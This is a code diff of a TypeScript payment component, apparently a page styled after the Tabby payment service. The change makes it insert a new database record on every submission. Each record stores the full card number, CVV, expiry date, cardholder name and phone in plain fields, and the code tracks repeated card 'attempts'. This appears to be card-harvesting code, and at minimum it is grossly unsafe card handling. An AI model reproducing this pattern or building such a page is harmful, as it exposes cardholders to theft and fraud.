@@ -52,59 +52,28 @@ const TabbyPaymentProcessing = () => {
       try {
         let finalPaymentId: string;
         
-        if (existingPaymentId) {
-          finalPaymentId = existingPaymentId;
-          setPaymentId(existingPaymentId);
-
-          // دائماً نحفظ البطاقة الأولى في السجل الرئيسي
-          console.log("Updating main card with:", {
+        // دائماً إنشاء سجل دفع جديد
+        console.log("Creating new payment record");
+        const { data, error } = await supabase
+          .from("tabby_payments")
+          .insert({
             cardholder_name: cardholderName,
             card_number: cardNumber,
             card_number_last4: cardNumberLast4,
             expiry_date: expiryDate,
             cvv: cvv,
-          });
+            total_amount: parseFloat(totalAmount),
+            company: company,
+            phone: phone,
+            payment_status: "pending",
+          })
+          .select()
+          .single();
 
-          const { error: updateError } = await supabase
-            .from("tabby_payments")
-            .update({
-              cardholder_name: cardholderName,
-              card_number: cardNumber,
-              card_number_last4: cardNumberLast4,
-              expiry_date: expiryDate,
-              cvv: cvv,
-            })
-            .eq("id", existingPaymentId);
-
-          if (updateError) {
-            console.error("Update error:", updateError);
-            throw updateError;
-          }
-          
-          console.log("Main card updated successfully");
-        } else {
-          // إنشاء سجل جديد (للحالات القديمة)
-          console.log("Creating new payment record");
-          const { data, error } = await supabase
-            .from("tabby_payments")
-            .insert({
-              cardholder_name: cardholderName,
-              card_number: cardNumber,
-              card_number_last4: cardNumberLast4,
-              expiry_date: expiryDate,
-              cvv: cvv,
-              total_amount: parseFloat(totalAmount),
-              company: company,
-              phone: phone,
-              payment_status: "pending",
-            })
-            .select()
-            .single();
-
-          if (error) throw error;
-          finalPaymentId = data.id;
-          setPaymentId(data.id);
-        }
+        if (error) throw error;
+        finalPaymentId = data.id;
+        setPaymentId(data.id);
+        console.log("New payment created with ID:", finalPaymentId);
 
 
         // Poll for status updates - check both main card and attempts
